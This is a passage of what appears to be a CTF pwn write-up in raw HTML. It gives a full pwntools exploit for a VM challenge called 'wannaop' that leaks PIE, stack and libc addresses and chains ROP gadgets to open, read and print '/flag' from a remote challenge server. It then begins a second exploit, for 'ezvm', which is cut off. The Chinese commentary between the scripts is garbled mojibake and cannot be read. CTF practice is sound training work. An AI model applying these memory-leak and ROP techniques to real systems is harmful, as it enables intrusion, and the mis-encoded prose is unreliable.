style="color:#2993a3">)</span><br><span style="color:#393A34">io</span><span style="color:#999999">.</span><span style="color:#393A34">sendline</span><span style="color:#2993a3">(</span><span style="color:#393A34">orw</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">io</span><span style="color:#999999">.</span><span style="color:#393A34">interactive</span><span style="color:#2993a3">(</span><span style="color:#2993a3">)</span><br></code></pre><pre data-theme="dark" class="code-snippet__pre code-snippet__pre--dark"><code class="language-python language-python"><span style="color:#4D9375">from</span><span style="color:#DBD7CAEE"> pwn </span><span style="color:#4D9375">import</span><span style="color:#CB7676"> *</span><br><span style="color:#4D9375">from</span><span style="color:#DBD7CAEE"> sys </span><span style="color:#4D9375">import</span><span style="color:#DBD7CAEE"> argv</span><br><br><span style="color:#DBD7CAEE">proc </span><span style="color:#666666">=</span><span style="color:#C98A7D77"> "</span><span style="color:#C98A7D">./wannaop</span><span style="color:#C98A7D77">"</span><br><span style="color:#DBD7CAEE">context</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">log_level </span><span style="color:#666666">=</span><span style="color:#C98A7D77"> "</span><span style="color:#C98A7D">debug</span><span style="color:#C98A7D77">"</span><br><span style="color:#DBD7CAEE">context</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">binary </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> proc</span><br><span style="color:#DBD7CAEE">elf </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> ELF</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">proc</span><span style="color:#666666">,</span><span style="color:#BD976A"> checksec</span><span style="color:#666666">=</span><span style="color:#4D9375">False</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">io </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> remote</span><span style="color:#5eaab5">(</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">173.33.5.48</span><span style="color:#C98A7D77">"</span><span style="color:#666666">,</span><span style="color:#4C9A91"> 9999</span><span style="color:#5eaab5">)</span><span style="color:#4D9375"> if</span><span style="color:#DBD7CAEE"> argv</span><span style="color:#5eaab5">[</span><span style="color:#4C9A91">1</span><span style="color:#5eaab5">]</span><span style="color:#CB7676"> ==</span><span style="color:#C98A7D77"> '</span><span style="color:#C98A7D">r</span><span style="color:#C98A7D77">'</span><span style="color:#4D9375"> else</span><span style="color:#DBD7CAEE"> process</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">proc</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">libc </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> ELF</span><span style="color:#5eaab5">(</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">./libc.so.6</span><span style="color:#C98A7D77">"</span><span style="color:#5eaab5">)</span><br><span style="color:#4D9375">if</span><span style="color:#DBD7CAEE"> args</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">G</span><span style="color:#666666">:</span><br><span style="color:#DBD7CAEE">    gdb</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">attach</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">io</span><span style="color:#5eaab5">)</span><br><br><br><span style="color:#CB7676">def</span><span style="color:#80A665"> choose</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">idx</span><span style="color:#5eaab5">)</span><span style="color:#666666">:</span><br><span style="color:#DBD7CAEE">    io</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">sendlineafter</span><span style="color:#5eaab5">(</span><span style="color:#CB7676">b</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">wanna op: </span><span style="color:#C98A7D77">"</span><span style="color:#666666">,</span><span style="color:#B8A965"> str</span><span style="color:#4d9375">(</span><span style="color:#DBD7CAEE">idx</span><span style="color:#4d9375">)</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">encode</span><span style="color:#4d9375">(</span><span style="color:#4d9375">)</span><span style="color:#5eaab5">)</span><br><br><br><span style="color:#CB7676">def</span><span style="color:#80A665"> push</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">op</span><span style="color:#5eaab5">)</span><span style="color:#666666">:</span><br><span style="color:#DBD7CAEE">    choose</span><span style="color:#5eaab5">(</span><span style="color:#4C9A91">0</span><span style="color:#5eaab5">)</span><br><span style="color:#4D9375">    if</span><span style="color:#DBD7CAEE"> op </span><span style="color:#CB7676">==</span><span style="color:#C98A7D77"> "</span><span style="color:#C98A7D">-</span><span style="color:#C98A7D77">"</span><span style="color:#666666">:</span><br><span style="color:#DBD7CAEE">        io</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">sendline</span><span style="color:#5eaab5">(</span><span style="color:#CB7676">b</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">-</span><span style="color:#C98A7D77">"</span><span style="color:#5eaab5">)</span><br><span style="color:#4D9375">    else</span><span style="color:#666666">:</span><br><span style="color:#DBD7CAEE">        io</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">sendline</span><span style="color:#5eaab5">(</span><span style="color:#B8A965">str</span><span style="color:#4d9375">(</span><span style="color:#DBD7CAEE">op</span><span style="color:#4d9375">)</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">encode</span><span style="color:#4d9375">(</span><span style="color:#4d9375">)</span><span style="color:#5eaab5">)</span><br><br><br><span style="color:#CB7676">def</span><span style="color:#80A665"> pop</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">op</span><span style="color:#5eaab5">)</span><span style="color:#666666">:</span><br><span style="color:#DBD7CAEE">    choose</span><span style="color:#5eaab5">(</span><span style="color:#4C9A91">1</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">    io</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">sendline</span><span style="color:#5eaab5">(</span><span style="color:#B8A965">str</span><span style="color:#4d9375">(</span><span style="color:#DBD7CAEE">op</span><span style="color:#4d9375">)</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">encode</span><span style="color:#4d9375">(</span><span style="color:#4d9375">)</span><span style="color:#5eaab5">)</span><br><br><br><span style="color:#CB7676">def</span><span style="color:#80A665"> add</span><span style="color:#5eaab5">(</span><span style="color:#5eaab5">)</span><span style="color:#666666">:</span><br><span style="color:#DBD7CAEE">    choose</span><span style="color:#5eaab5">(</span><span style="color:#4C9A91">2</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">    io</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">sendline</span><span style="color:#5eaab5">(</span><span style="color:#CB7676">b</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">0</span><span style="color:#C98A7D77">"</span><span style="color:#5eaab5">)</span><br><br><br><span style="color:#CB7676">def</span><span style="color:#80A665"> sub</span><span style="color:#5eaab5">(</span><span style="color:#5eaab5">)</span><span style="color:#666666">:</span><br><span style="color:#DBD7CAEE">    choose</span><span style="color:#5eaab5">(</span><span style="color:#4C9A91">3</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">    io</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">sendline</span><span style="color:#5eaab5">(</span><span style="color:#CB7676">b</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">0</span><span style="color:#C98A7D77">"</span><span style="color:#5eaab5">)</span><br><br><br><span style="color:#CB7676">def</span><span style="color:#80A665"> xor</span><span style="color:#5eaab5">(</span><span style="color:#5eaab5">)</span><span style="color:#666666">:</span><br><span style="color:#DBD7CAEE">    choose</span><span style="color:#5eaab5">(</span><span style="color:#4C9A91">4</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">    io</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">sendline</span><span style="color:#5eaab5">(</span><span style="color:#CB7676">b</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">0</span><span style="color:#C98A7D77">"</span><span style="color:#5eaab5">)</span><br><br><br><span style="color:#CB7676">def</span><span style="color:#80A665"> store</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">op</span><span style="color:#5eaab5">)</span><span style="color:#666666">:</span><br><span style="color:#DBD7CAEE">    choose</span><span style="color:#5eaab5">(</span><span style="color:#4C9A91">6</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">    io</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">sendline</span><span style="color:#5eaab5">(</span><span style="color:#B8A965">str</span><span style="color:#4d9375">(</span><span style="color:#DBD7CAEE">op</span><span style="color:#4d9375">)</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">encode</span><span style="color:#4d9375">(</span><span style="color:#4d9375">)</span><span style="color:#5eaab5">)</span><br><br><br><span style="color:#CB7676">def</span><span style="color:#80A665"> ret</span><span style="color:#5eaab5">(</span><span style="color:#5eaab5">)</span><span style="color:#666666">:</span><br><span style="color:#DBD7CAEE">    choose</span><span style="color:#5eaab5">(</span><span style="color:#4C9A91">7</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">    io</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">sendline</span><span style="color:#5eaab5">(</span><span style="color:#CB7676">b</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">0</span><span style="color:#C98A7D77">"</span><span style="color:#5eaab5">)</span><br><br><br><span style="color:#CB7676">def</span><span style="color:#80A665"> leak</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">op</span><span style="color:#5eaab5">)</span><span style="color:#666666">:</span><br><span style="color:#DBD7CAEE">    choose</span><span style="color:#5eaab5">(</span><span style="color:#4C9A91">5</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">    io</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">sendline</span><span style="color:#5eaab5">(</span><span style="color:#B8A965">str</span><span style="color:#4d9375">(</span><span style="color:#DBD7CAEE">op</span><span style="color:#4d9375">)</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">encode</span><span style="color:#4d9375">(</span><span style="color:#4d9375">)</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">    b </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> io</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">recvuntil</span><span style="color:#5eaab5">(</span><span style="color:#CB7676">b</span><span style="color:#C98A7D77">"</span><span style="color:#C99076">\n</span><span style="color:#C98A7D77">"</span><span style="color:#666666">,</span><span style="color:#BD976A"> drop</span><span style="color:#666666">=</span><span style="color:#4D9375">True</span><span style="color:#5eaab5">)</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">decode</span><span style="color:#5eaab5">(</span><span style="color:#5eaab5">)</span><br><span style="color:#4D9375">    return</span><span style="color:#B8A965"> int</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">b</span><span style="color:#666666">,</span><span style="color:#4C9A91"> 10</span><span style="color:#5eaab5">)</span><br><br><br><span style="color:#CB7676">def</span><span style="color:#80A665"> write64</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">addr</span><span style="color:#5eaab5">)</span><span style="color:#666666">:</span><br><span style="color:#DBD7CAEE">    push</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">addr </span><span style="color:#CB7676">&#x26;</span><span style="color:#CB7676"> 0x</span><span style="color:#4C9A91">ffffffff</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">    push</span><span style="color:#5eaab5">(</span><span style="color:#4d9375">(</span><span style="color:#DBD7CAEE">addr </span><span style="color:#CB7676">></span><span style="color:#CB7676">></span><span style="color:#4C9A91"> 32</span><span style="color:#4d9375">)</span><span style="color:#CB7676"> &#x26;</span><span style="color:#CB7676"> 0x</span><span style="color:#4C9A91">ffffffff</span><span style="color:#5eaab5">)</span><br><br><span style="color:#758575DD"># vm: 0x7fffffffcb10</span><br><span style="color:#758575DD"># sp: 0x7fffffffd0e0</span><br><br><br><span style="color:#DBD7CAEE">res </span><span style="color:#666666">=</span><span style="color:#CB7676"> b</span><span style="color:#C98A7D77">""</span><br><span style="color:#4D9375">for</span><span style="color:#DBD7CAEE"> i </span><span style="color:#4D9375">in</span><span style="color:#B8A965"> range</span><span style="color:#5eaab5">(</span><span style="color:#4C9A91">8</span><span style="color:#5eaab5">)</span><span style="color:#666666">:</span><br><span style="color:#DBD7CAEE">    res </span><span style="color:#666666">+=</span><span style="color:#DBD7CAEE"> p8</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">leak</span><span style="color:#4d9375">(</span><span style="color:#CB7676">-0x</span><span style="color:#4C9A91">41c</span><span style="color:#CB7676"> +</span><span style="color:#DBD7CAEE"> i</span><span style="color:#4d9375">)</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">pie_addr </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> u64</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">res</span><span style="color:#5eaab5">)</span><span style="color:#CB7676"> -</span><span style="color:#CB7676"> 0x</span><span style="color:#4C9A91">1734</span><br><span style="color:#DBD7CAEE">log</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">info</span><span style="color:#5eaab5">(</span><span style="color:#CB7676">f</span><span style="color:#C98A7D">"pie_addr => </span><span style="color:#4d9375">{</span><span style="color:#B8A965">hex</span><span style="color:#d4976c">(</span><span style="color:#DBD7CAEE">pie_addr</span><span style="color:#d4976c">)</span><span style="color:#4d9375">}</span><span style="color:#C98A7D">"</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">res </span><span style="color:#666666">=</span><span style="color:#CB7676"> b</span><span style="color:#C98A7D77">""</span><br><span style="color:#4D9375">for</span><span style="color:#DBD7CAEE"> i </span><span style="color:#4D9375">in</span><span style="color:#B8A965"> range</span><span style="color:#5eaab5">(</span><span style="color:#4C9A91">8</span><span style="color:#5eaab5">)</span><span style="color:#666666">:</span><br><span style="color:#DBD7CAEE">    res </span><span style="color:#666666">+=</span><span style="color:#DBD7CAEE"> p8</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">leak</span><span style="color:#4d9375">(</span><span style="color:#CB7676">-0x</span><span style="color:#4C9A91">41c</span><span style="color:#CB7676"> +</span><span style="color:#DBD7CAEE"> i </span><span style="color:#CB7676">-</span><span style="color:#4C9A91"> 8</span><span style="color:#4d9375">)</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">stack_addr </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> u64</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">res</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">log</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">info</span><span style="color:#5eaab5">(</span><span style="color:#CB7676">f</span><span style="color:#C98A7D">"stack_addr => </span><span style="color:#4d9375">{</span><span style="color:#B8A965">hex</span><span style="color:#d4976c">(</span><span style="color:#DBD7CAEE">stack_addr</span><span style="color:#d4976c">)</span><span style="color:#4d9375">}</span><span style="color:#C98A7D">"</span><span style="color:#5eaab5">)</span><br><br><span style="color:#DBD7CAEE">pop_rdi_ret </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> pie_addr </span><span style="color:#CB7676">+</span><span style="color:#CB7676"> 0x</span><span style="color:#4C9A91">00000000000017c3</span><br><span style="color:#DBD7CAEE">pop_rsi_ret </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> pie_addr </span><span style="color:#CB7676">+</span><span style="color:#CB7676"> 0x</span><span style="color:#4C9A91">00000000000017c1</span><br><span style="color:#DBD7CAEE">target_addr </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> stack_addr </span><span style="color:#CB7676">-</span><span style="color:#CB7676"> 0x</span><span style="color:#4C9A91">608</span><br><span style="color:#DBD7CAEE">puts_addr </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> pie_addr </span><span style="color:#CB7676">+</span><span style="color:#CB7676"> 0x</span><span style="color:#4C9A91">10f0</span><br><span style="color:#DBD7CAEE">main_addr </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> pie_addr </span><span style="color:#CB7676">+</span><span style="color:#CB7676"> 0x</span><span style="color:#4C9A91">1692</span><br><span style="color:#4D9375">for</span><span style="color:#DBD7CAEE"> i </span><span style="color:#4D9375">in</span><span style="color:#B8A965"> range</span><span style="color:#5eaab5">(</span><span style="color:#4C9A91">256</span><span style="color:#5eaab5">)</span><span style="color:#666666">:</span><br><span style="color:#DBD7CAEE">    push</span><span style="color:#5eaab5">(</span><span style="color:#4C9A91">0</span><span style="color:#5eaab5">)</span><br><br><span style="color:#DBD7CAEE">push</span><span style="color:#5eaab5">(</span><span style="color:#CB7676">0x</span><span style="color:#4C9A91">145</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">write64</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">pop_rdi_ret</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">write64</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">target_addr</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">write64</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">puts_addr</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">write64</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">main_addr</span><span style="color:#5eaab5">)</span><br><br><span style="color:#DBD7CAEE">ret</span><span style="color:#5eaab5">(</span><span style="color:#5eaab5">)</span><br><br><span style="color:#DBD7CAEE">libc_addr </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> u64</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">io</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">recvuntil</span><span style="color:#4d9375">(</span><span style="color:#CB7676">b</span><span style="color:#C98A7D77">"</span><span style="color:#C99076">\n</span><span style="color:#C98A7D77">"</span><span style="color:#666666">,</span><span style="color:#BD976A"> drop</span><span style="color:#666666">=</span><span style="color:#4D9375">True</span><span style="color:#4d9375">)</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">ljust</span><span style="color:#4d9375">(</span><span style="color:#4C9A91">8</span><span style="color:#666666">,</span><span style="color:#CB7676"> b</span><span style="color:#C98A7D77">"</span><span style="color:#C99076">\x00</span><span style="color:#C98A7D77">"</span><span style="color:#4d9375">)</span><span style="color:#5eaab5">)</span><span style="color:#CB7676"> -</span><span style="color:#CB7676"> 0x</span><span style="color:#4C9A91">63162</span><br><span style="color:#DBD7CAEE">log</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">info</span><span style="color:#5eaab5">(</span><span style="color:#CB7676">f</span><span style="color:#C98A7D">"libc_addr => </span><span style="color:#4d9375">{</span><span style="color:#B8A965">hex</span><span style="color:#d4976c">(</span><span style="color:#DBD7CAEE">libc_addr</span><span style="color:#d4976c">)</span><span style="color:#4d9375">}</span><span style="color:#C98A7D">"</span><span style="color:#5eaab5">)</span><br><br><span style="color:#DBD7CAEE">pop_rsi_ret </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> libc_addr </span><span style="color:#CB7676">+</span><span style="color:#CB7676"> 0x</span><span style="color:#4C9A91">000000000002601f</span><br><span style="color:#DBD7CAEE">pop_rdx_ret </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> libc_addr </span><span style="color:#CB7676">+</span><span style="color:#CB7676"> 0x</span><span style="color:#4C9A91">000000000015fae6</span><br><span style="color:#DBD7CAEE">pop_rax_ret </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> libc_addr </span><span style="color:#CB7676">+</span><span style="color:#CB7676"> 0x</span><span style="color:#4C9A91">0000000000036174</span><br><span style="color:#DBD7CAEE">syscall </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> libc_addr </span><span style="color:#CB7676">+</span><span style="color:#CB7676"> 0x</span><span style="color:#4C9A91">00000000000630a9</span><br><span style="color:#DBD7CAEE">libc</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">address </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> libc_addr</span><br><span style="color:#DBD7CAEE">pop_rax_rdx_rbx_ret </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> libc_addr </span><span style="color:#CB7676">+</span><span style="color:#CB7676"> 0x</span><span style="color:#4C9A91">000000000015fae5</span><br><span style="color:#4D9375">for</span><span style="color:#DBD7CAEE"> i </span><span style="color:#4D9375">in</span><span style="color:#B8A965"> range</span><span style="color:#5eaab5">(</span><span style="color:#4C9A91">254</span><span style="color:#5eaab5">)</span><span style="color:#666666">:</span><br><span style="color:#DBD7CAEE">    push</span><span style="color:#5eaab5">(</span><span style="color:#4C9A91">0</span><span style="color:#5eaab5">)</span><br><br><span style="color:#DBD7CAEE">push</span><span style="color:#5eaab5">(</span><span style="color:#CB7676">0x</span><span style="color:#4C9A91">616c662f</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">push</span><span style="color:#5eaab5">(</span><span style="color:#CB7676">0x</span><span style="color:#4C9A91">67</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">push</span><span style="color:#5eaab5">(</span><span style="color:#CB7676">0x</span><span style="color:#4C9A91">145</span><span style="color:#5eaab5">)</span><br><br><span style="color:#DBD7CAEE">reread </span><span style="color:#666666">=</span><span style="color:#666666"> </span><span style="color:#5eaab5">[</span><span style="color:#DBD7CAEE">pop_rdi_ret</span><span style="color:#666666">,</span><span style="color:#4C9A91"> 0</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> pop_rsi_ret</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> stack_addr </span><span style="color:#CB7676">+</span><span style="color:#CB7676"> 0x</span><span style="color:#4C9A91">70</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> pop_rax_rdx_rbx_ret</span><span style="color:#666666">,</span><span style="color:#4C9A91"> 0</span><span style="color:#666666">,</span><span style="color:#CB7676"> 0x</span><span style="color:#4C9A91">300</span><span style="color:#666666">,</span><span style="color:#4C9A91"> 0</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> syscall</span><span style="color:#5eaab5">]</span><br><span style="color:#DBD7CAEE">orw </span><span style="color:#666666">=</span><span style="color:#666666"> </span><span style="color:#5eaab5">[</span><span style="color:#DBD7CAEE">pop_rdi_ret</span><span style="color:#666666">,</span><span style="color:#CB7676"> -</span><span style="color:#4C9A91">100</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> pop_rsi_ret</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> stack_addr </span><span style="color:#CB7676">-</span><span style="color:#CB7676"> 0x</span><span style="color:#4C9A91">f8</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> pop_rdx_ret</span><span style="color:#666666">,</span><span style="color:#4C9A91"> 0</span><span style="color:#666666">,</span><span style="color:#4C9A91"> 0</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> pop_rax_ret</span><span style="color:#666666">,</span><span style="color:#4C9A91"> 257</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> syscall</span><span style="color:#5eaab5">]</span><br><span style="color:#DBD7CAEE">orw </span><span style="color:#666666">+=</span><span style="color:#666666"> </span><span style="color:#5eaab5">[</span><span style="color:#DBD7CAEE">pop_rdi_ret</span><span style="color:#666666">,</span><span style="color:#4C9A91"> 3</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> pop_rsi_ret</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> stack_addr </span><span style="color:#CB7676">+</span><span style="color:#CB7676"> 0x</span><span style="color:#4C9A91">400</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> pop_rdx_ret</span><span style="color:#666666">,</span><span style="color:#CB7676"> 0x</span><span style="color:#4C9A91">100</span><span style="color:#666666">,</span><span style="color:#4C9A91"> 0</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> pop_rax_ret</span><span style="color:#666666">,</span><span style="color:#4C9A91"> 0</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> syscall</span><span style="color:#5eaab5">]</span><br><span style="color:#DBD7CAEE">orw </span><span style="color:#666666">+=</span><span style="color:#666666"> </span><span style="color:#5eaab5">[</span><span style="color:#DBD7CAEE">pop_rdi_ret</span><span style="color:#666666">,</span><span style="color:#4C9A91"> 1</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> pop_rsi_ret</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> stack_addr </span><span style="color:#CB7676">+</span><span style="color:#CB7676"> 0x</span><span style="color:#4C9A91">400</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> pop_rdx_ret</span><span style="color:#666666">,</span><span style="color:#CB7676"> 0x</span><span style="color:#4C9A91">100</span><span style="color:#666666">,</span><span style="color:#4C9A91"> 0</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> pop_rax_ret</span><span style="color:#666666">,</span><span style="color:#4C9A91"> 1</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> syscall</span><span style="color:#5eaab5">]</span><br><span style="color:#DBD7CAEE">orw </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> flat</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">orw</span><span style="color:#5eaab5">)</span><br><span style="color:#758575DD"># print(res)</span><br><br><span style="color:#4D9375">for</span><span style="color:#DBD7CAEE"> i </span><span style="color:#4D9375">in</span><span style="color:#DBD7CAEE"> reread</span><span style="color:#666666">:</span><br><span style="color:#DBD7CAEE">    write64</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">i</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">ret</span><span style="color:#5eaab5">(</span><span style="color:#5eaab5">)</span><br><span style="color:#B8A965">print</span><span style="color:#5eaab5">(</span><span style="color:#B8A965">hex</span><span style="color:#4d9375">(</span><span style="color:#DBD7CAEE">stack_addr</span><span style="color:#4d9375">)</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">io</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">sendline</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">orw</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">io</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">interactive</span><span style="color:#5eaab5">(</span><span style="color:#5eaab5">)</span><br></code></pre></div>
<p>æ¯”èµ›çš„æ—¶å€™å‘ç°ä¸å°‘äººéƒ½å¡åœ¨æ‰¾åˆ° leak è¿™ä¸€æ­¥ï¼Œå¦å¤–æˆ‘æ‰“è¿œç¨‹çš„æ—¶å€™å¿˜äº†å…³ä»£ç†å¯¼è‡´è°ƒäº†åŠå¤©ä»¥ä¸ºæ˜¯ exp é—®é¢˜ï¼Œç»™è¯»è€…æä¸ªé†’ï¼Œçº¿ä¸‹æ‰“æ¯”èµ›åŠ¡å¿…å…³ä»£ç†ï¼Œå“ªæ€•å¹³å°èƒ½æ­£å¸¸è®¿é—®ï¼Œä¹Ÿæœ‰å¯èƒ½æŸä¸ªé¶æœºä¸èƒ½è®¿é—®æ‘†ä½ ä¸€é“ã€‚</p>
<h4 id="ezvm" class="scroll-target"><a href="#ezvm"><code class="hash inline-code">#</code>ezvm</a></h4>
<p>ä¾ç„¶æ˜¯ vm é¢˜ï¼Œï¼Œå¾ˆé€†å¤©ã€‚æ¯”è¾ƒå€’éœ‰çš„æ˜¯æˆ‘è¿™ä¸ªé¢˜å¿˜äº†å­˜ i64 äº†ï¼Œæ‰€ä»¥è¿™é‡Œå°±ä¸ä»”ç»†åˆ†æäº†ã€‚</p>
<p>å¤§æ¦‚å°±æ˜¯é¢˜ç›®ç›´æ¥ç»™äººä»»æ„è¯»å’Œä»»æ„å†™çš„åŸè¯­ <code class="inline-code">load</code> å’Œ <code class="inline-code">store</code>ï¼Œä½†æ˜¯å®ƒä»¬éƒ½æœ‰ä¸€ä¸ªå…³äºæœ€é«˜ç¬¦å·ä½çš„ checkï¼Œè€Œè¿™ä¸ªç¬¦å·ä½æ˜¯åœ¨ load ç«‹å³æ•°æ—¶è®¾ç½®çš„ï¼Œä¹Ÿå°±æ˜¯è¯´å¦‚æœæƒ³å®ç°ä»»æ„åœ°å€è¯»å†™åŸè¯­ï¼Œå¾—å…ˆè§£å†³è¿™ä¸ªç¬¦å·ä½çš„é—®é¢˜ã€‚ä»”ç»†åˆ†æä¸€ä¼šå¯ä»¥å‘ç°ï¼Œalu æ“ä½œæ—é‡Œçš„ <code class="inline-code">mul</code> å’Œ <code class="inline-code">div</code> æ“ä½œå¯ä»¥è§£å†³è¿™ä¸ªé—®é¢˜ã€‚ç„¶åå°±æ˜¯å®ç°è¿™ä¸ªåŸè¯­ï¼ŒæŠŠ <code class="inline-code">puts@got</code> æ”¹æˆ ogg ç»“æŸã€‚</p>
<div class="code-snippet"><pre data-theme="light" class="code-snippet__pre code-snippet__pre--light"><code class="language-python language-python"><span style="color:#1E754F">from</span><span style="color:#393A34"> pwn </span><span style="color:#1E754F">import</span><span style="color:#AB5959"> *</span><br><span style="color:#1E754F">from</span><span style="color:#393A34"> sys </span><span style="color:#1E754F">import</span><span style="color:#393A34"> argv</span><br><br><span style="color:#393A34">proc </span><span style="color:#999999">=</span><span style="color:#B5695977"> "</span><span style="color:#B56959">./easyvm</span><span style="color:#B5695977">"</span><br><span style="color:#393A34">context</span><span style="color:#999999">.</span><span style="color:#393A34">log_level </span><span style="color:#999999">=</span><span style="color:#B5695977"> "</span><span style="color:#B56959">debug</span><span style="color:#B5695977">"</span><br><span style="color:#393A34">context</span><span style="color:#999999">.</span><span style="color:#393A34">binary </span><span style="color:#999999">=</span><span style="color:#393A34"> proc</span><br><span 